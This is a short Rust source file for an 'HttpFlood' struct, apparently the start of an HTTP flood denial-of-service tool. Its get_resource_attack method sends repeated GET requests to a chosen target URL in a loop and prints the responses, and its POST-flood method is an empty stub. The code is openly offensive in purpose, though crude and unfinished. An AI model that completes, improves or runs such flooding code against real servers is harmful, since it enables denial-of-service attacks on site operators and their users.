use reqwest;

// 1. post request in the form
// 2. get resource(html,css,js)
pub struct HttpFlood {
    target_url: String,
    times: u32,
}

impl HttpFlood {
    pub fn new(target_url: String, times: u32) -> Self {
        Self { target_url, times }
    }

    pub async fn post_requeste_attack(&self, text: String) {
        for _ in 0..self.times{
            

        }
    }

    pub async fn get_resource_attack(&self) {

        for _ in 0..self.times{
            // Create a reqwest Client
            let client = reqwest::blocking::Client::new();
    
            // Make a GET request to a URL
            let response = client
                .get(&self.target_url)
                .send();
    
            // Check if the request was successful
            match response {
                Ok(res) => {
                    if res.status().is_success() {
                        // Read the response body as a string
                        let body = res.text().unwrap();
                        println!("Response body: {}", body);
                    } else {
                        println!("Request failed with status code: {}", res.status());
                    }
                }
                Err(err) => {
                    println!("Error occurred: {}", err);
                }
            }
        }
        }
}
